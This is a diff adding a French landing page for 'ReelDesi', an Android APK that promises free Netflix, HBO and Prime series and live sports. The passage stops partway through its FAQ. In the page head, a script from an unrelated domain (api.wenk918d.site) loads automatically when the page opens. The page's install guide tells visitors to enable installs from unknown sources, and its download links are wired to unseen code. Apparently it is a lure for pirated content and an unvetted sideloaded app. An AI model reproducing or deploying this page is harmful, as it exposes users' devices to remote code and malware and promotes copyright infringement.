@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="fr" class="scroll-smooth">
+<head>
+    <!-- charset must be placed at the top of the head -->
+    <meta charset="UTF-8">
+    
+   
+   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    
+    <title>ReelDesi — Sports en direct, films et séries à succès gratuits uniquement</title>
+    <meta content="ReelDesi : l'application Android gratuite pour le sport en direct, les films à succès, les séries et les actualités mondiales. Téléchargement APK rapide en qualité HD/4K." name="description">
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        brand: {
+                            500: '#8b5cf6', // Violet
+                            600: '#7c3aed',
+                            900: '#4c1d95',
+                        },
+                        dark: {
+                            900: '#0f172a', // Slate 900
+                            950: '#020617', // Slate 950
+                        }
+                    },
+                    animation: {
+                        'marquee': 'marquee linear infinite',
+                    },
+                    keyframes: {
+                        marquee: {
+                            '0%': { transform: 'translateX(0%)' },
+                            '100%': { transform: 'translateX(-50%)' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <style>
+        body {
+            background-color: #020617; /* Slate 950 */
+            color: #f8fafc;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        .hero-bg {
+            position: absolute;
+            top: 0; left: 0; right: 0; height: 800px;
+            background: radial-gradient(circle at 50% 0%, rgba(124, 58, 237, 0.15) 0%, transparent 70%);
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .marquee-container {
+            display: flex;
+            width: max-content;
+        }
+        
+        .marquee-container:hover {
+            animation-play-state: paused;
+        }
+
+        .text-gradient {
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0f172a; 
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #334155; 
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #475569; 
+        }
+    </style>
+</head>
+<body class="relative pb-32">
+
+    <div class="hero-bg"></div>
+
+    <header class="fixed top-0 w-full z-50 bg-dark-950/80 backdrop-blur-md border-b border-white/10">
+        <div class="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
+            <a href="#" class="flex items-center gap-2" data-download="true">
+                <div class="bg-gradient-to-br from-brand-500 to-pink-500 text-white font-black italic text-xl px-2 py-1 rounded-md shadow-lg shadow-brand-500/30">ReelDesi</div>
+            </a>
+            
+            <div class="flex items-center gap-4">
+                <a href="#install" class="hidden sm:block text-sm font-medium text-slate-300 hover:text-white transition">Guide d'installation</a>
+            </div>
+        </div>
+    </header>
+
+    <main class="pt-24 md:pt-32 px-4 max-w-7xl mx-auto">
+        <section class="text-center flex flex-col items-center mb-16">
+            <div class="inline-flex items-center gap-2 bg-slate-800/50 border border-slate-700 rounded-full px-4 py-1.5 text-xs md:text-sm text-slate-300 mb-6">
+                <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
+                TV EN DIRECT • Sports • Films • Gratuit à vie uniquement
+            </div>
+            
+            <h1 class="text-4xl md:text-6xl font-extrabold tracking-tight leading-tight mb-6 max-w-4xl">
+                <span>ReelDesi — Sports en direct,</span><br>
+                <span class="bg-gradient-to-r from-yellow-400 to-yellow-200 text-gradient">Films à succès, séries et actualités</span><br>
+                <span class="text-slate-300 text-3xl md:text-5xl">— APK rapide et 100 % gratuit uniquement</span>
+            </h1>
+            
+            <p class="text-slate-400 text-base md:text-xl max-w-2xl mb-8">
+                Une seule application Android pour les matchs sportifs en direct, le cinéma à succès, les séries tendance, les actualités mondiales, la finance et les chaînes privées.
+            </p>
+            
+            <a href="#" data-download="true" class="group relative inline-flex items-center justify-center gap-3 bg-brand-600 hover:bg-brand-500 text-white text-lg font-bold px-8 py-4 rounded-full shadow-[0_0_40px_rgba(124,58,237,0.4)] transition-all hover:scale-105 active:scale-95">
+                <svg fill="currentColor" height="24" viewBox="0 0 24 24" width="24">
+                    <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path>
+                </svg>
+                <span>Installer ReelDesi APK maintenant</span>
+            </a>
+
+            <!-- Stats Grid -->
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-8 mt-12 w-full max-w-3xl">
+                <div class="bg-slate-900/50 border border-slate-800 p-4 rounded-2xl flex flex-col items-center">
+                    <div class="text-2xl font-bold text-white mb-1">1000+</div>
+                    <div class="text-xs text-slate-400 uppercase tracking-wider">Chaînes</div>
+                </div>
+                <div class="bg-slate-900/50 border border-slate-800 p-4 rounded-2xl flex flex-col items-center">
+                    <div class="text-2xl font-bold text-white mb-1">4K</div>
+                    <div class="text-xs text-slate-400 uppercase tracking-wider">Qualité</div>
+                </div>
+                <div class="bg-slate-900/50 border border-slate-800 p-4 rounded-2xl flex flex-col items-center">
+                    <div class="text-2xl font-bold text-white mb-1">5 lakh+</div>
+                    <div class="text-xs text-slate-400 uppercase tracking-wider">Utilisateurs</div>
+                </div>
+                <div class="bg-slate-900/50 border border-slate-800 p-4 rounded-2xl flex flex-col items-center">
+                    <div class="text-2xl font-bold text-green-400 mb-1">GRATUIT</div>
+                    <div class="text-xs text-slate-400 uppercase tracking-wider">Toujours gratuit</div>
+                </div>
+            </div>
+        </section>
+
+        <div class="h-px bg-gradient-to-r from-transparent via-slate-700 to-transparent my-10"></div>
+
+        <section class="mb-12 overflow-hidden">
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-xl md:text-2xl font-bold flex items-center gap-2">
+                    <span class="text-2xl">🎬</span> Séries à succès du monde entier
+                </h2>
+                <a href="#" data-download="true" class="text-brand-500 text-sm font-semibold hover:text-brand-400">Dans l'app →</a>
+            </div>
+            <p class="text-slate-400 text-sm mb-6">Netflix • Amazon Prime • Hotstar • SonyLIV • Les séries les plus tendance de 2026</p>
+            
+            <div class="relative w-[100vw] left-1/2 -ml-[50vw]">
+                <div class="marquee-container animate-[marquee_32s_linear_infinite]">
+                    <!-- Original Set -->
+                    <div class="flex gap-4 px-2">
+                        <!-- Card 1 -->
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/4a.png" onerror="this.src='images/squid_game_fallback.jpg'" alt="Squid Game" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-gradient-to-r from-purple-600 to-pink-500 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">🔥 À SUCCÈS</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">Tendances et populaires</h3>
+                            <p class="text-xs text-slate-400 truncate">Netflix • 2026</p>
+                        </a>
+                        <!-- Card 2 -->
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/wednesday.jpg" onerror="this.src='images/wednesday_fallback.jpg'" alt="Wednesday" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-blue-600 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">4K</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">Wednesday S2</h3>
+                            <p class="text-xs text-slate-400 truncate">Netflix • Mystère</p>
+                        </a>
+                        <!-- Card 3 -->
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/stranger_things.jpg" onerror="this.src='images/stranger_things_fallback.jpg'" alt="Stranger Things" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-green-500 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">EN DIRECT</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">Stranger Things 5</h3>
+                            <p class="text-xs text-slate-400 truncate">Netflix • Sci-Fi</p>
+                        </a>
+                        <!-- Card 4 -->
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/house_of_dragon.jpg" onerror="this.src='images/house_of_dragon_fallback.jpg'" alt="House of the Dragon" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-slate-700 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">HD</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">House of the Dragon S3</h3>
+                            <p class="text-xs text-slate-400 truncate">HBO Max • Fantasy</p>
+                        </a>
+                        <!-- Card 5 -->
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/2a.png" onerror="this.src='images/the_bear_fallback.jpg'" alt="The Bear" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-brand-500 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">🆕 NOUVEAU</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">Tendances et populaires</h3>
+                            <p class="text-xs text-slate-400 truncate">Netflix • 2026</p>
+                        </a>
+                        <!-- Card 6 -->
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/bridgerton.jpg" onerror="this.src='images/bridgerton_fallback.jpg'" alt="Bridgerton" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-green-500 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">EN DIRECT</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">Bridgerton S4</h3>
+                            <p class="text-xs text-slate-400 truncate">Netflix • Romance</p>
+                        </a>
+                    </div>
+                    <!-- Duplicate Set for Marquee Loop -->
+                    <div class="flex gap-4 px-2">
+                        <!-- Cloned Cards -->
+                    
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/wednesday.jpg" onerror="this.src='images/wednesday_fallback.jpg'" alt="Wednesday" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-blue-600 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">4K</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">Wednesday S2</h3>
+                            <p class="text-xs text-slate-400 truncate">Netflix • Mystère</p>
+                        </a>
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/stranger_things.jpg" onerror="this.src='images/stranger_things_fallback.jpg'" alt="Stranger Things" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-green-500 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">EN DIRECT</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">Stranger Things 5</h3>
+                            <p class="text-xs text-slate-400 truncate">Netflix • Sci-Fi</p>
+                        </a>
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/house_of_dragon.jpg" onerror="this.src='images/house_of_dragon_fallback.jpg'" alt="House of the Dragon" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-slate-700 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">HD</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">House of the Dragon S3</h3>
+                            <p class="text-xs text-slate-400 truncate">HBO Max • Fantasy</p>
+                        </a>
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/the_bear.jpg" onerror="this.src='images/the_bear_fallback.jpg'" alt="The Bear" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-brand-500 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">🆕 NOUVEAU</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">Séries indiennes</h3>
+                            <p class="text-xs text-slate-400 truncate">Netflix 2026</p>
+                        </a>
+                        <a href="#" data-download="true" class="group flex-none w-[140px] md:w-[160px]">
+                            <div class="relative rounded-xl overflow-hidden mb-2 shadow-lg shadow-black/50">
+                                <img src="images/bridgerton.jpg" onerror="this.src='images/bridgerton_fallback.jpg'" alt="Bridgerton" class="w-full h-[200px] md:h-[220px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute top-2 left-2 bg-green-500 text-[10px] font-bold px-2 py-0.5 rounded text-white shadow">EN DIRECT</div>
+                                <div class="absolute top-2 right-2 bg-black/60 backdrop-blur text-[10px] font-bold px-1.5 py-0.5 rounded text-white border border-white/10">GRATUIT</div>
+                            </div>
+                            <h3 class="font-semibold text-sm truncate text-white">Bridgerton S4</h3>
+                            <p class="text-xs text-slate-400 truncate">Netflix • Romance</p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <div class="h-px bg-gradient-to-r from-transparent via-slate-700 to-transparent my-10"></div>
+        
+        <section class="bg-gradient-to-br from-slate-900 to-slate-950 border border-slate-800 rounded-3xl p-6 md:p-10 mb-12 shadow-2xl relative overflow-hidden">
+            <!-- Decorative blur -->
+            <div class="absolute -top-20 -right-20 w-64 h-64 bg-brand-600/20 rounded-full blur-3xl pointer-events-none"></div>
+            
+            <div class="text-center mb-10">
+                <div class="inline-block bg-white text-black font-black italic px-3 py-1 rounded mb-2">ReelDesi</div>
+                <p class="text-xl md:text-2xl font-bold text-white">Divertissement en direct et gratuit de premier ordre</p>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-10">
+                <div class="flex items-start gap-4">
+                    <div class="bg-slate-800 p-3 rounded-xl text-2xl">👤</div>
+                    <div>
+                        <h3 class="font-bold text-white mb-1">Installez ReelDesi et profitez</h3>
+                        <p class="text-sm text-slate-400">Sports en direct • Films • Séries • Actualités — tout dans une seule app</p>
+                    </div>
+                </div>
+                <div class="flex items-start gap-4">
+                    <div class="bg-slate-800 p-3 rounded-xl text-2xl">⚡</div>
+                    <div>
+                        <h3 class="font-bold text-white mb-1">Processus d'installation simple</h3>
+                        <p class="text-sm text-slate-400">Téléchargez l'APK → Ouvrez-le et commencez à vous divertir instantanément</p>
+                    </div>
+                </div>
+                <div class="flex items-start gap-4">
+                    <div class="bg-slate-800 p-3 rounded-xl text-2xl">🌙</div>
+                    <div>
+                        <h3 class="font-bold text-white mb-1">Cinéma nocturne et salles privées</h3>
+                        <p class="text-sm text-slate-400">Films de nuit et sections premium disponibles pour un visionnage sans tension</p>
+                    </div>
+                </div>
+                <div class="flex items-start gap-4">
+                    <div class="bg-slate-800 p-3 rounded-xl text-2xl">🎁</div>
+                    <div>
+                        <h3 class="font-bold text-white mb-1">Partagez avec vos amis</h3>
+                        <p class="text-sm text-slate-400">Invitez vos amis et débloquez encore plus de chaînes VIP</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="text-center">
+                <a href="#" data-download="true" class="inline-block bg-white text-black font-bold text-lg px-8 py-4 rounded-xl shadow-lg hover:bg-slate-200 transition-colors w-full md:w-auto">
+                    ⬇ Téléchargez ReelDesi APK dès aujourd'hui !
+                </a>
+            </div>
+        </section>
+
+        <div class="h-px bg-gradient-to-r from-transparent via-slate-700 to-transparent my-10"></div>
+
+        <section class="mb-12 overflow-hidden">
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-xl md:text-2xl font-bold flex items-center gap-2">
+                    <span class="text-2xl">🏆</span> Sports en direct et soirées match
+                </h2>
+                <a href="#" data-download="true" class="text-brand-500 text-sm font-semibold hover:text-brand-400">Dans l'app →</a>
+            </div>
+            <p class="text-slate-400 text-sm mb-6">IPL • Coupe du monde de cricket • Premier League • WWE • F1 — entièrement en direct</p>
+            
+            <div class="relative w-[100vw] left-1/2 -ml-[50vw]">
+                <div class="marquee-container animate-[marquee_40s_linear_infinite]">
+                    <!-- Original Set -->
+                    <div class="flex gap-4 px-2">
+                        <a href="#" data-download="true" class="group flex-none w-[280px] md:w-[320px]">
+                            <div class="relative rounded-xl overflow-hidden shadow-lg shadow-black/50">
+                                <img src="images/nba.jpg" alt="NBA & IPL" class="w-full h-[160px] md:h-[180px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent"></div>
+                                <h3 class="absolute bottom-3 left-4 font-bold text-white text-sm md:text-base">Finales NBA et IPL 2026</h3>
+                            </div>
+                        </a>
+                        <a href="#" data-download="true" class="group flex-none w-[280px] md:w-[320px]">
+                            <div class="relative rounded-xl overflow-hidden shadow-lg shadow-black/50">
+                                <img src="images/premier_league.jpg" alt="Premier League" class="w-full h-[160px] md:h-[180px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent"></div>
+                                <h3 class="absolute bottom-3 left-4 font-bold text-white text-sm md:text-base">Premier League anglaise</h3>
+                            </div>
+                        </a>
+                        <a href="#" data-download="true" class="group flex-none w-[280px] md:w-[320px]">
+                            <div class="relative rounded-xl overflow-hidden shadow-lg shadow-black/50">
+                                <img src="images/f1.jpg" onerror="this.src='images/f1_placeholder.png'" alt="F1" class="w-full h-[160px] md:h-[180px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent"></div>
+                                <h3 class="absolute bottom-3 left-4 font-bold text-white text-sm md:text-base">Grand Prix F1 2026</h3>
+                            </div>
+                        </a>
+                        <a href="#" data-download="true" class="group flex-none w-[280px] md:w-[320px]">
+                            <div class="relative rounded-xl overflow-hidden shadow-lg shadow-black/50">
+                                <img src="images/ufc.jpg" onerror="this.src='images/ufc_placeholder.png'" alt="UFC" class="w-full h-[160px] md:h-[180px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent"></div>
+                                <h3 class="absolute bottom-3 left-4 font-bold text-white text-sm md:text-base">UFC et WWE en streaming live</h3>
+                            </div>
+                        </a>
+                    </div>
+                     <!-- Duplicate Set for loop -->
+                     <div class="flex gap-4 px-2">
+                        <a href="#" data-download="true" class="group flex-none w-[280px] md:w-[320px]">
+                            <div class="relative rounded-xl overflow-hidden shadow-lg shadow-black/50">
+                                <img src="images/nba.jpg" alt="NBA & IPL" class="w-full h-[160px] md:h-[180px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent"></div>
+                                <h3 class="absolute bottom-3 left-4 font-bold text-white text-sm md:text-base">Finales NBA et IPL 2026</h3>
+                            </div>
+                        </a>
+                        <a href="#" data-download="true" class="group flex-none w-[280px] md:w-[320px]">
+                            <div class="relative rounded-xl overflow-hidden shadow-lg shadow-black/50">
+                                <img src="images/premier_league.jpg" alt="Premier League" class="w-full h-[160px] md:h-[180px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent"></div>
+                                <h3 class="absolute bottom-3 left-4 font-bold text-white text-sm md:text-base">Premier League anglaise</h3>
+                            </div>
+                        </a>
+                        <a href="#" data-download="true" class="group flex-none w-[280px] md:w-[320px]">
+                            <div class="relative rounded-xl overflow-hidden shadow-lg shadow-black/50">
+                                <img src="images/f1.jpg" onerror="this.src='images/f1_placeholder.png'" alt="F1" class="w-full h-[160px] md:h-[180px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent"></div>
+                                <h3 class="absolute bottom-3 left-4 font-bold text-white text-sm md:text-base">Grand Prix F1 2026</h3>
+                            </div>
+                        </a>
+                        <a href="#" data-download="true" class="group flex-none w-[280px] md:w-[320px]">
+                            <div class="relative rounded-xl overflow-hidden shadow-lg shadow-black/50">
+                                <img src="images/ufc.jpg" onerror="this.src='images/ufc_placeholder.png'" alt="UFC" class="w-full h-[160px] md:h-[180px] object-cover group-hover:scale-110 transition duration-500">
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent"></div>
+                                <h3 class="absolute bottom-3 left-4 font-bold text-white text-sm md:text-base">UFC et WWE en streaming live</h3>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <div class="h-px bg-gradient-to-r from-transparent via-slate-700 to-transparent my-10"></div>
+
+        <section class="mb-16">
+            <h2 class="text-2xl md:text-3xl font-bold mb-8 text-center"><span class="text-3xl">✨</span> Pourquoi choisir ReelDesi ?</h2>
+            
+            <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 md:gap-6">
+                <div class="bg-slate-900 border border-slate-800 p-6 rounded-2xl hover:border-brand-500 transition-colors">
+                    <div class="text-4xl mb-4">📡</div>
+                    <h3 class="text-lg font-bold text-white mb-2">1000+ chaînes TV</h3>
+                    <p class="text-slate-400 text-sm">Chaînes TV en direct sélectionnées dans plus de 130 pays, prêtes à être regardées.</p>
+                </div>
+                <div class="bg-slate-900 border border-slate-800 p-6 rounded-2xl hover:border-brand-500 transition-colors">
+                    <div class="text-4xl mb-4">🎬</div>
+                    <h3 class="text-lg font-bold text-white mb-2">Sélection premium</h3>
+                    <p class="text-slate-400 text-sm">Séries à succès, films et émissions spéciales pour toute la famille.</p>
+                </div>
+                <div class="bg-slate-900 border border-slate-800 p-6 rounded-2xl hover:border-brand-500 transition-colors">
+                    <div class="text-4xl mb-4">🚫</div>
+                    <h3 class="text-lg font-bold text-white mb-2">Zéro perturbation</h3>
+                    <p class="text-slate-400 text-sm">Oubliez les pop-ups ou les publicités irritantes dans vos vidéos. Visionnage pur et sans tension.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="mb-16 bg-slate-900/50 rounded-3xl p-6 md:p-10 border border-slate-800">
+            <h2 class="text-2xl font-bold mb-6 text-center">ReelDesi vs. plateformes payantes</h2>
+            <div class="overflow-x-auto">
+                <table class="w-full text-left border-collapse min-w-[500px]">
+                    <thead>
+                        <tr class="border-b border-slate-700">
+                            <th class="py-4 px-4 text-slate-400 font-semibold w-1/3">Fonctionnalité</th>
+                            <th class="py-4 px-4 font-bold text-brand-400 w-1/3 text-center bg-brand-900/10 rounded-t-lg">ReelDesi</th>
+                            <th class="py-4 px-4 text-slate-400 font-semibold w-1/3 text-center">Autres plateformes</th>
+                        </tr>
+                    </thead>
+                    <tbody class="text-sm md:text-base">
+                        <tr class="border-b border-slate-800">
+                            <td class="py-4 px-4">Frais mensuels</td>
+                            <td class="py-4 px-4 text-center font-semibold text-green-400 bg-brand-900/5">100 % gratuit uniquement</td>
+                            <td class="py-4 px-4 text-center text-slate-500">Forfaits payants coûteux</td>
+                        </tr>
+                        <tr class="border-b border-slate-800">
+                            <td class="py-4 px-4">Sports en direct</td>
+                            <td class="py-4 px-4 text-center text-white bg-brand-900/5">✓ Tout inclus</td>
+                            <td class="py-4 px-4 text-center text-slate-500">Limité / frais supplémentaires</td>
+                        </tr>
+                        <tr class="border-b border-slate-800">
+                            <td class="py-4 px-4">Chaînes TV</td>
+                            <td class="py-4 px-4 text-center text-white bg-brand-900/5">1000+</td>
+                            <td class="py-4 px-4 text-center text-slate-500">50-200 max</td>
+                        </tr>
+                        <tr class="border-b border-slate-800">
+                            <td class="py-4 px-4">Inscription requise</td>
+                            <td class="py-4 px-4 text-center text-white bg-brand-900/5">Aucune nécessaire</td>
+                            <td class="py-4 px-4 text-center text-slate-500">Obligatoire</td>
+                        </tr>
+                        <tr>
+                            <td class="py-4 px-4">Qualité d'image</td>
+                            <td class="py-4 px-4 text-center text-white bg-brand-900/5 rounded-b-lg">Qualité HD / 4K</td>
+                            <td class="py-4 px-4 text-center text-slate-500">Variable (selon le forfait)</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <section id="install" class="mb-16">
+            <h2 class="text-2xl md:text-3xl font-bold mb-8 text-center"><span class="text-3xl">📲</span> Guide rapide d'installation de l'APK</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <div class="bg-slate-900 p-6 rounded-2xl relative border border-slate-800">
+                    <div class="absolute -top-4 -left-4 w-10 h-10 bg-brand-600 rounded-full flex items-center justify-center font-bold text-lg shadow-lg">1</div>
+                    <h3 class="text-xl font-bold text-white mb-2 mt-2">Télécharger l'APK</h3>
+                    <p class="text-slate-400 text-sm">Appuyez sur le bouton de téléchargement sur cette page. Le fichier APK sera automatiquement enregistré sur votre mobile.</p>
+                </div>
+                <div class="bg-slate-900 p-6 rounded-2xl relative border border-slate-800">
+                    <div class="absolute -top-4 -left-4 w-10 h-10 bg-brand-600 rounded-full flex items-center justify-center font-bold text-lg shadow-lg">2</div>
+                    <h3 class="text-xl font-bold text-white mb-2 mt-2">Autoriser l'installation</h3>
+                    <p class="text-slate-400 text-sm">Si un message d'avertissement apparaît, allez dans Paramètres → Sécurité → Activez « Installer depuis des sources inconnues ».</p>
+                </div>
+                <div class="bg-slate-900 p-6 rounded-2xl relative border border-slate-800">
+                    <div class="absolute -top-4 -left-4 w-10 h-10 bg-brand-600 rounded-full flex items-center justify-center font-bold text-lg shadow-lg">3</div>
+                    <h3 class="text-xl font-bold text-white mb-2 mt-2">Installer et ouvrir</h3>
+                    <p class="text-slate-400 text-sm">Cherchez l'APK dans votre dossier Téléchargements, appuyez dessus pour l'installer, ouvrez ReelDesi et profitez de votre divertissement !</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="mb-16">
+            <h2 class="text-2xl font-bold mb-6 text-center">Questions fréquentes (FAQ)</h2>
+            <div class="max-w-3xl mx-auto space-y-4">
+                <div class="bg-slate-900 rounded-xl p-5 border border-slate-800">
+                    <h3 class="font-bold text-lg text-white mb-2">ReelDesi est-il entièrement gratuit ?</h3>
+                    <p class="text-slate-400 text-sm">Oui. ReelDesi est gratuit à installer et à utiliser, sans frais mensuels cachés ni abonnements.</p>
+                </div>
+                <div class="bg-slate-900 rounded-xl p-5 border border-slate-800">
+                    <h3 class="font-bold text-lg text-white mb-2">Quel contenu est disponible ?</h3>
+                    <p class="text-slate-400 text-sm">Plus de 1000 chaînes TV en direct de plus de 130 pays, sports en direct, séries premium, actualités mondiales, informations financières, chaînes privées et bien plus encore.</p>
+                </div>
+                <div class="bg-slate-900 rounded-xl p-5 border border-slate-800">
+                    <h3 class="font-bold text-lg text-white mb-2">Ai-je besoin d'un compte pour l'utiliser ?</h3>
+                    <p class="text-slate-400 text-sm">Non ! Aucune inscription, connexion ou e-mail requis. Installez simplement l'application et commencez à regarder immédiatement.</p>
+                </div>
+                <div class="bg-slate-900 rounded-xl p-5 border border-slate-800">
